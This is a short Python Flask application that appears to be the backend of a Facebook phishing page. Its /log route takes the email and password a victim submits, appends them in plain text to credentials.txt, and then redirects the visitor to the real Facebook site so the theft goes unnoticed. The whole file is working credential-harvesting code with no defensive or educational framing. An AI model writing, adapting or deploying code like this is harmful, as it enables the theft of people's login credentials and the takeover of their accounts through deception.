from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)

@app.route('/')
def index():
    with open('index.html', 'r') as file:
        html_content = file.read()
    return render_template_string(html_content)

@app.route('/log', methods=['POST'])
def log_credentials():
    email = request.form.get('email')
    password = request.form.get('password')
    
    # Log the credentials to a file
    with open('credentials.txt', 'a') as f:
        f.write(f'Email: {email}, Password: {password}\n')
    
    # Redirect to the actual Facebook login page
    return redirect('https://www.facebook.com')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
